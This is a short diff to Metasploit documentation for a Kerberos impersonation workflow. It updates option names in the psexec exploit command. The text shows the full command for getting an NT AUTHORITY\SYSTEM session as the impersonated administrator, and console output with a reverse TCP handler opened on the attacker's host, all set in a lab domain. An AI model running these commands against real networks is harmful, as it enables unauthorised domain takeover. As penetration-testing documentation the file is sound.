@@ -57,7 +57,7 @@ The module will go through the following steps:
   automatically use the TGS cached from the previous steps.
 
 1. Do: `use windows/smb/psexec`
-1. Do: `exploit rhosts=<remote host> lhost=<local host> smbuser=administrator smbdomain=<FQDN domain name> SmbAuth=kerberos SmbRhostname=<DC hostname in FQDN format> DomainControllerRhost=<DC IP>`
+1. Do: `exploit rhosts=<remote host> lhost=<local host> smbuser=administrator smb::domain=<FQDN domain name> Smb::Auth=kerberos Smb::Rhostname=<DC hostname in FQDN format> DomainControllerRhost=<DC IP>`
 1. Verify you got a session as the `NT AUTHORITY\SYSTEM` user
 
 ## Options
@@ -192,7 +192,8 @@ host             service  type                 name             content         
 
 ### Using `psexec` with the TGS impersonating the Administrator
 ```
-msf6 exploit(windows/smb/psexec) > exploit rhosts=192.168.100.104 lhost=192.168.100.1 smbuser=administrator smbdomain=mylab.local SmbAuth=kerberos SmbRhostname=dc02.mylab.local DomainControllerRhost=192.168.100.104
+msf6 exploit(windows/smb/psexec) > exploit rhosts=192.168.100.104 lhost=192.168.100.1 smbuser=administrator smbdomain=mylab.local Smb::Auth=kerberos Smb::Rhostname=dc02.mylab.local DomainControllerRhost=192.168.100.104
+
 
 [*] Started reverse TCP handler on 192.168.100.1:4444
 [*] 192.168.100.104:445 - Connecting to the server...
